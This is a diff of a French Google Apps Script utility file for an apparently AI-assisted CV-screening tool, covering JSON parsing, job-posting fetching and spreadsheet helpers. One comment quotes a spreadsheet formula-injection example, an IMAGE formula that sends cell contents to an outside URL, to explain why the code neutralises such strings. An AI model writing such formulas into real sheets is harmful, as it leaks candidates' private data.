@@ -1,10 +1,15 @@
 /**
  * Utils.gs
- * Fonctions utilitaires diverses (parsing, requêtes HTTP simples).
+ * Fonctions utilitaires diverses (parsing, requêtes HTTP simples, normalisations).
  */
 
 /**
  * Analyse et extrait le format JSON de la réponse de l'IA de manière sécurisée et robuste.
+ *
+ * L'analyse directe passe en premier : avec `responseSchema`, Gemini rend du
+ * JSON pur, et l'extraction par expression régulière ne sert qu'aux réponses
+ * enveloppées de texte. Dans l'ordre inverse, l'expression — qui ne suit pas
+ * plus d'un niveau d'imbrication — tronquait les réponses à objets imbriqués.
  * @param {string} text Le texte brut retourné par l'API
  * @returns {Object} L'objet JSON parsé
  */
@@ -13,28 +18,26 @@ function parseJsonSafely(text) {
     throw new Error("Réponse vide ou invalide de l'API.");
   }
 
-  let cleaned = text.trim();
+  const cleaned = text.trim().replace(/^```(?:json)?\s*/i, '').replace(/```$/i, '').trim();
 
-  // Supprimer les balises Markdown
-  cleaned = cleaned.replace(/^```(?:json)?\s*/i, "").replace(/```$/i, "").trim();
-
-  // Extraire le premier objet JSON valide
-  const jsonMatch = cleaned.match(/\{[^}]*(?:\{[^}]*\}[^}]*)*\}/);
-  if (jsonMatch) {
-    try {
-      return JSON.parse(jsonMatch[0]);
-    } catch (e) {
-      Logger.log(`Échec du parsing JSON (match): ${e.message}`);
-    }
-  }
-
-  // Essayer de parser directement
   try {
     return JSON.parse(cleaned);
   } catch (e) {
     Logger.log(`Échec du parsing JSON (direct): ${e.message}`);
-    throw new Error(`Impossible de décoder l'analyse IA. Assurez-vous que l'annonce est compréhensible. Texte reçu: "${cleaned.substring(0, 200)}..."`);
   }
+
+  // Repli : du premier « { » au dernier « } », pour une réponse entourée de texte.
+  const debut = cleaned.indexOf('{');
+  const fin = cleaned.lastIndexOf('}');
+  if (debut !== -1 && fin > debut) {
+    try {
+      return JSON.parse(cleaned.substring(debut, fin + 1));
+    } catch (e) {
+      Logger.log(`Échec du parsing JSON (extrait): ${e.message}`);
+    }
+  }
+
+  throw new Error(`Impossible de décoder l'analyse IA. Texte reçu : "${cleaned.substring(0, 200)}..."`);
 }
 
 /**
@@ -43,7 +46,7 @@ function parseJsonSafely(text) {
  * @returns {boolean} True si valide, false sinon.
  */
 function isValidEmail(email) {
-  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email || '').trim());
 }
 
 /**
@@ -55,44 +58,11 @@ function isValidEmail(email) {
 function isDomainAllowed(domain, allowedDomainsStr) {
   if (!domain) return false;
   const cleanDomain = domain.toLowerCase().trim();
-  const allowedList = (allowedDomainsStr || "").split(",")
-    .map(d => d.trim().toLowerCase())
-    .filter(d => d);
-  
-  return allowedList.some(allowed => cleanDomain === allowed || cleanDomain.endsWith("." + allowed));
-}
+  const allowedList = (allowedDomainsStr || '').split(',')
+    .map((d) => d.trim().toLowerCase())
+    .filter((d) => d);
 
-/**
- * Fonction pure de calcul des recommandations pour la prise de contact.
- * Plafonne le statut "À contacter" aux MAX_CONTACT_CANDIDATES meilleurs profils qualifiés (note >= MIN_CONTACT_SCORE).
- * Les profils qualifiés au-delà du plafond basculent en "À garder en vivier".
- * Les profils avec note < MIN_CONTACT_SCORE ne sont jamais proposés en prise de contact active.
- * 
- * @param {Array<{recommendation: string, score: number}>} candidates
- * @param {number} [maxContact=MAX_CONTACT_CANDIDATES]
- * @param {number} [minScore=MIN_CONTACT_SCORE]
- * @returns {Array<string>} Nouvelle liste des recommandations harmonisées
- */
-function computeContactRecommendations(candidates, maxContact = MAX_CONTACT_CANDIDATES, minScore = MIN_CONTACT_SCORE) {
-  let contactCount = 0;
-  return candidates.map(c => {
-    const reco = (c.recommendation || '').toString().trim();
-    const score = Number(c.score) || 0;
-
-    const isQualifying = (reco === "À contacter" || score >= minScore) && reco !== "À refuser" && score >= 3;
-
-    if (isQualifying && score >= minScore) {
-      if (contactCount < maxContact) {
-        contactCount++;
-        return "À contacter";
-      } else {
-        return "À garder en vivier";
-      }
-    } else if (reco === "À contacter" && score < minScore) {
-      return score <= 2 ? "À refuser" : "À garder en vivier";
-    }
-    return reco || "À garder en vivier";
-  });
+  return allowedList.some((allowed) => cleanDomain === allowed || cleanDomain.endsWith(`.${allowed}`));
 }
 
 /**
@@ -120,24 +90,24 @@ function fetchJobDescription(url, allowedDomainsStr) {
 
   // Vérifier si le domaine est autorisé de façon stricte (exact ou sous-domaine)
   if (!isDomainAllowed(domain, allowedDomainsStr)) {
-    throw new Error(`Domaine non autorisé: ${domain}. Veuillez copier-coller le texte de l'annonce manuellement ou l'ajouter aux Domaines autorisés dans la Configuration.`);
+    throw new Error(`Domaine non autorisé : ${domain}. Copiez-collez le texte de l'annonce, ou ajoutez ce domaine aux « Domaines autorisés » dans les options avancées du panneau.`);
   }
 
   const response = UrlFetchApp.fetch(url, {
-    muteHttpExceptions: false,
+    muteHttpExceptions: true,
     followRedirects: false,
     headers: {
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     },
-    validateHttpsCertificates: true
+    validateHttpsCertificates: true,
   });
 
   const code = response.getResponseCode();
   if (code >= 300 && code < 400) {
-    throw new Error(`L'URL redirige vers une autre page (HTTP ${code}). Veuillez copier-coller l'URL finale de l'offre d'emploi ou son texte directement dans la cellule.`);
+    throw new Error(`L'URL redirige vers une autre page (HTTP ${code}). Indiquez l'URL finale de l'offre, ou collez son texte.`);
   }
   if (code === 403 || code === 401) {
-    throw new Error(`Accès refusé par le site (HTTP ${code}). Ce site protège son contenu contre la lecture automatique. Veuillez copier-coller le texte de l'annonce directement dans la cellule correspondante.`);
+    throw new Error(`Accès refusé par le site (HTTP ${code}). Ce site protège son contenu contre la lecture automatique : collez le texte de l'annonce.`);
   }
   if (code !== 200) {
     throw new Error(`Erreur de connexion HTTP ${code}. L'annonce est peut-être temporairement inaccessible.`);
@@ -155,20 +125,17 @@ function fetchJobDescription(url, allowedDomainsStr) {
 
   // Sécurité : si le texte résultant est trop court, la page bloque probablement les robots
   if (text.length < 200) {
-    throw new Error(`La page de l'annonce semble vide ou protégée contre le scraping (${text.length} caractères récupérés). Veuillez copier-coller directement le texte de l'annonce.`);
+    throw new Error(`La page de l'annonce semble vide ou protégée contre la lecture automatique (${text.length} caractères récupérés). Collez le texte de l'annonce.`);
   }
 
   // Heuristique pour détecter les pages SPA / JS-only qui chargent une coquille vide
   const textLower = text.toLowerCase();
-  const keywords = ["profil", "poste", "mission", "compétence", "expérience", "experience", "recherche", "candidat"];
-  let keywordCount = 0;
-  for (const kw of keywords) {
-    if (textLower.includes(kw)) keywordCount++;
-  }
-  
+  const keywords = ['profil', 'poste', 'mission', 'compétence', 'expérience', 'experience', 'recherche', 'candidat'];
+  const keywordCount = keywords.filter((kw) => textLower.includes(kw)).length;
+
   if (keywordCount < 2) {
-    Logger.log("Alerte Heuristique: " + text.substring(0, 500));
-    throw new Error(`L'annonce récupérée semble incomplète ou générée en JavaScript (ex: LinkedIn, ATS moderne). L'IA ne pourra pas l'analyser correctement. Veuillez copier-coller le texte de l'annonce manuellement.`);
+    Logger.log(`Alerte heuristique : ${text.substring(0, 500)}`);
+    throw new Error("L'annonce récupérée semble incomplète ou générée en JavaScript (ex. LinkedIn, ATS moderne). Collez le texte de l'annonce.");
   }
 
   return text;
@@ -187,16 +154,91 @@ function mergeJobState(existing, updates, now) {
   const timestamp = typeof now === 'number' ? now : Date.now();
 
   return {
-    status: patch.status !== undefined ? patch.status : (current.status || "IDLE"),
-    source: patch.source !== undefined ? patch.source : (current.source || "automated"),
+    status: patch.status !== undefined ? patch.status : (current.status || 'IDLE'),
+    source: patch.source !== undefined ? patch.source : (current.source || 'automated'),
     total: patch.total !== undefined ? Number(patch.total) : (Number(current.total) || 0),
     processed: patch.processed !== undefined ? Number(patch.processed) : (Number(current.processed) || 0),
     successCount: patch.successCount !== undefined ? Number(patch.successCount) : (Number(current.successCount) || 0),
     errorCount: patch.errorCount !== undefined ? Number(patch.errorCount) : (Number(current.errorCount) || 0),
     topContactCount: patch.topContactCount !== undefined ? Number(patch.topContactCount) : (Number(current.topContactCount) || 0),
-    currentFileName: patch.currentFileName !== undefined ? String(patch.currentFileName) : (current.currentFileName || ""),
-    errorMessage: patch.errorMessage !== undefined ? String(patch.errorMessage) : (current.errorMessage || ""),
+    currentFileName: patch.currentFileName !== undefined ? String(patch.currentFileName) : (current.currentFileName || ''),
+    errorMessage: patch.errorMessage !== undefined ? String(patch.errorMessage) : (current.errorMessage || ''),
     recentCandidates: Array.isArray(patch.recentCandidates) ? patch.recentCandidates : (Array.isArray(current.recentCandidates) ? current.recentCandidates : []),
-    lastUpdated: timestamp
+    lastUpdated: timestamp,
   };
 }
+
+/** Espaces, tabulations et sauts de ligne ramenés à une espace simple. */
+const normaliserEspaces_ = (texte) => String(texte ?? '').replace(/\s+/g, ' ').trim();
+
+/**
+ * Forme de comparaison : sans accents, sans casse, espaces normalisés.
+ * « à contacter », « A Contacter » et « À contacter » se valent.
+ */
+const normaliserComparaison_ = (texte) => normaliserEspaces_(texte)
+  .normalize('NFD').replace(/[̀-ͯ]/g, '').toLowerCase();
+
+/**
+ * Empreinte SHA-256 d'un texte, en hexadécimal.
+ *
+ * `computeDigest` rend des octets **signés** (-128 à 127) : sans le `& 0xff`,
+ * un octet négatif donnerait « -1a » au lieu de « e6 », et deux textes
+ * différents pourraient partager une empreinte.
+ */
+const empreinteTexte_ = (texte) => Utilities
+  .computeDigest(Utilities.DigestAlgorithm.SHA_256, String(texte), Utilities.Charset.UTF_8)
+  .map((octet) => (octet & 0xff).toString(16).padStart(2, '0'))
+  .join('');
+
+/**
+ * Rend inoffensive, pour Sheets, une chaîne venue d'ailleurs (CV, réponse de l'IA).
+ *
+ * Une chaîne écrite par `setValues` qui commence par = + - ou @ devient une
+ * formule. Un CV qui porterait `=IMAGE("https://…"&A1)` en guise de nom ferait
+ * sortir le contenu du classeur à chaque ouverture. L'apostrophe initiale force
+ * le texte et n'apparaît pas à la lecture. C'est la seule frontière : toute
+ * valeur écrite dans l'onglet Résultats passe par ici.
+ */
+const neutraliserFormule_ = (valeur) => (typeof valeur === 'string' && /^[=+\-@]/.test(valeur)
+  ? `'${valeur}`
+  : valeur);
+
+/**
+ * Instant en millisecondes, quelle que soit la forme lue dans une cellule.
+ *
+ * Sheets rend un objet `Date` pour une date, jamais la chaîne qu'on lui a
+ * donnée ; une chaîne `String(date)` se comparerait sur le nom du jour.
+ * Rend `null` quand la valeur n'est pas une date lisible : « inconnu » n'est
+ * pas « le plus ancien ».
+ */
+const instantEnMs_ = (valeur) => {
+  if (valeur === null || valeur === undefined || valeur === '') return null;
+  if (Object.prototype.toString.call(valeur) === '[object Date]') {
+    const ms = valeur.getTime();
+    return Number.isNaN(ms) ? null : ms;
+  }
+  if (typeof valeur === 'number') return Number.isFinite(valeur) ? valeur : null;
+  const ms = Date.parse(String(valeur));
+  return Number.isNaN(ms) ? null : ms;
+};
+
+/** Nombre au format français, sans zéros inutiles : 0.5 → « 0,5 », 3 → « 3 ». */
+const formaterNombre_ = (nombre) => String(Math.round(Number(nombre) * 100) / 100).replace('.', ',');
+
+/** « 1 CV analysé », « 3 CV analysés », « 0 candidat ». */
+const accorder_ = (n, singulier, pluriel = `${singulier}s`) => `${n} ${n > 1 ? pluriel : singulier}`;
+
+/** Tronque un texte à `longueur` caractères, avec une ellipse si besoin. */
+const tronquer_ = (texte, longueur) => {
+  const propre = normaliserEspaces_(texte);
+  return propre.length > longueur ? `${propre.substring(0, longueur - 1)}…` : propre;
+};
+
+/** Date lisible en français, pour les messages : « 28 septembre 2026 ». */
+const dateLisible_ = (date) => {
+  const mois = ['janvier', 'février', 'mars', 'avril', 'mai', 'juin', 'juillet', 'août',
+    'septembre', 'octobre', 'novembre', 'décembre'];
+  const [annee, m, jour] = Utilities.formatDate(date, Session.getScriptTimeZone(), 'yyyy-MM-dd')
+    .split('-').map(Number);
+  return `${jour} ${mois[m - 1]} ${annee}`;
+};
